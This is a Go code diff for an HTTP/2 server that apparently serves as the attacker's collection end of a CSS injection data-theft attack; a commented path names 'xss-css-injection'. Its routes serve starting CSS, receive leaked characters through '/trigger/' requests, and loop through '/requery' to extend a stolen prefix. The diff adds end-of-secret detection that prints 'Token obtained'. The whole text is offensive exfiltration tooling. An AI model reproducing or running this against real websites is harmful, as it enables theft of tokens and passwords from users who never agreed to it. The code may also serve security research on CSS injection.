@@ -4,16 +4,14 @@ import (
 	"fmt"
 	"net/http"
 	"path/filepath"
-	"strconv"
 	"strings"
 
 	"golang.org/x/net/http2"
 )
 
-func RunHttpServer(conf_path string) {
+func RunHttpServer(ConfPath string) {
 
-	conf := Parse_conf(conf_path)
-	// conf := Parse_conf("/home/debian/main/xss-css-injection/conf.yml")
+	conf := Parse_conf(ConfPath)
 
 	server := &http.Server{
 		Addr: ":" + conf.Port,
@@ -21,33 +19,62 @@ func RunHttpServer(conf_path string) {
 	http2.ConfigureServer(server, &http2.Server{})
 
 	fmt.Println("Server started and listen on " + conf.IPAddr + ":" + conf.Port)
-	chl := make(chan string)
+	chl := make(chan [2]string)
 	http.HandleFunc("/", func(writer http.ResponseWriter, request *http.Request) {
 		catch(writer, request, chl, conf)
 	})
-	server.ListenAndServeTLS(conf.Crt_path, conf.Key_path)
+	server.ListenAndServeTLS(conf.CrtPath, conf.KeyPath)
 	// server.ListenAndServe()
 }
 
-func catch(writer http.ResponseWriter, request *http.Request, chl chan string, conf Conf) {
-	n_loop := &Loop_n
+func catch(writer http.ResponseWriter, request *http.Request, chl chan [2]string, conf Conf) {
+	storedPayload := &StoredPayload
+	payloadEndCheck := &PayloadEndCheck
+
+	if len(*payloadEndCheck) == 2 && isEnd(*storedPayload, *payloadEndCheck) == true {
+		fmt.Println("Token obtained :" + *storedPayload)
+		SendRequest(writer, "")
+		return
+	}
+
 	switch {
 	case strings.Contains(request.URL.String(), "/start.css"):
-		*n_loop = 0
-		Loop(writer, "", *n_loop, conf.IPAddr, conf.Port)
+		Loop(writer, [2]string{"", "endcheck"}, conf.DN, conf.Port)
 	case strings.Contains(request.URL.String(), "/trigger/"):
-		knowed_passwd := filepath.Base(request.URL.String())
-		fmt.Println("Send " + knowed_passwd + " through channel")
-		chl <- knowed_passwd
+		urlExtracted := filepath.Base(request.URL.String())
+		if len(*payloadEndCheck) <= 2 {
+			if len(*payloadEndCheck) <= len(urlExtracted) {
+				*payloadEndCheck = urlExtracted
+			}
+			if len(*payloadEndCheck) == 2 {
+				chl <- [2]string{"", "classic"}
+			} else {
+				chl <- [2]string{*payloadEndCheck, "endcheck"}
+			}
+			fmt.Println(len(*payloadEndCheck))
+			fmt.Println("End with :" + *payloadEndCheck)
+		} else {
+			if len(*storedPayload) <= len(urlExtracted) {
+				*storedPayload = urlExtracted
+			}
+			fmt.Println("Start with :" + *storedPayload)
+			chl <- [2]string{*storedPayload, "classic"}
+		}
 		SendRequest(writer, "")
 	case strings.Contains(request.URL.String(), "/requery"):
-		*n_loop = *n_loop + 1
-		fmt.Println("Nombre de boucle: " + strconv.Itoa(*n_loop))
-		fmt.Println("Wait knowed payload")
-		knowed_passwd := <-chl
-		Loop(writer, knowed_passwd, *n_loop, conf.IPAddr, conf.Port)
+		KnowedPasswd := <-chl
+		// time.Sleep(1 * time.Second)
+		Loop(writer, KnowedPasswd, conf.DN, conf.Port)
 	default:
 		fmt.Println(request.URL.String())
 		fmt.Println("default")
+	}
+}
+
+func isEnd(storedPayload string, payloadEndCheck string) bool {
+	if strings.HasSuffix(storedPayload, payloadEndCheck) {
+		return true
+	} else {
+		return false
 	}
 }
